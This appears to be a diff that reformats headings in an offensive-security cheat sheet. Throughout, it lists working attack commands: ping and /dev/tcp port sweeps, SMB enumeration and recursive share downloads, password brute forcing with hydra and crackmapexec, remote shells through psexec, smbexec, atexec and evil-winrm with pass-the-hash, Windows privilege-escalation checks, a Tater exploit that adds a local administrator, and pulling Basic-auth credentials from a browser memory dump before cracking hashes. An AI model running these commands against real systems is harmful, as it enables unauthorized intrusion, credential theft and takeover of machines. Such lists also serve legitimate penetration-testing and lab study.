@@ -2,7 +2,7 @@ HOST DISCOVERY/SCANNING
 BASH/TERM > for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done
 BASH/TERM > for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
 
-SMB
+##### SMB
 
 nmap -p139,445 --script "smb-vuln-* and not(smb-vuln-regsvc-dos)" --script-args smb-vuln-cve-2017-7494.check-version,unsafe=1 <IP>
 smbmap -H <IP>
@@ -21,19 +21,22 @@ smbclient --list //<Target_IP>/ -U ""
 smbclient --no-pass -L //$IP
 smbclient //<IP>/<SHARE>
 
-# Download all files from a directory recursively
+## Download all files from a directory recursively
 smbclient //<IP>/<SHARE> -U <USER> -c "prompt OFF;recurse ON;mget *"
-Brute force
+
+## Brute force
 crackmapexec smb <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
 hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> smb://<IP> -u -vV
-Mount a SMB share
+
+## Mount a SMB share
 mkdir /tmp/share
 sudo mount -t cifs //<IP>/<SHARE> /tmp/share
 sudo mount -t cifs -o 'username=<USER>,password=<PASSWORD>'//<IP>/<SHARE> /tmp/share
 
 smbclient //<IP>/<SHARE>
 smbclient //<IP>/<SHARE> -U <USER>
-Get a shell
+
+## Get a shell
 psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
 psexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
 
@@ -46,17 +49,18 @@ smbexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
 atexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP> <COMMAND>
 atexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
 
-WINRM - 5985 - 5986
-Brute force
+##### WINRM - 5985 - 5986
+## Brute force
 crackmapexec winrm <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
-Connecting
+
+## Connecting
 evil-winrm -i <IP> -u <USER> -p <PASSWORD>
 evil-winrm -i <IP> -u <USER> -H <HASH>
 
-REMOTE ENUMERATION
+##### REMOTE ENUMERATION
 gobuster dir -u http://<ip>:80 -w <wordlist> 
  
-WINDOWS PRIVESC
+##### WINDOWS PRIVESC
 accesschk64.exe -wvu "<file location>"  
 Registry PrivEsc-AlwaysInstallElevated  
 reg query HKLM\Software\Policies\Microsoft\Windows\Installer  
@@ -70,20 +74,20 @@ sc start regsvc
 icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 wmic service get,name,displayname,pathname,startmode | findstr /v /i "C:\Windows" (Non-default Services / Special focus on PathNames not quoted)
 
-HOT POTATO  
+## HOT POTATO  
 powershell.exe -nop -ep bypass  
 Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1  
 Invoke-Tater -Trigger 1 -Command "net localgroup administrators <username> /add"  
 net localgroup administrators  
 
-PASSWORDS IN MEMORY
+## PASSWORDS IN MEMORY
 CMD > taskmgr
 GUI > Rightclick “iexplore.exe” in the “Image Name” columnand select “Create Dump File”.
 GUI OR CMD > Copy iexplorer.DMP to Attacking Box
 TERM > strings <dumpfile>.DMP | grep "Authorization: Basic"
 TERM > echo -ne <Base64 String> | base64 -d
 
-PASSWORD CRACKING  
+##### PASSWORD CRACKING  
 hashcat -m 1000 <hash> <wordlist>  
 john --wordlist=/usr/share/wordlists/rockyou.txt <hashfile>  
 
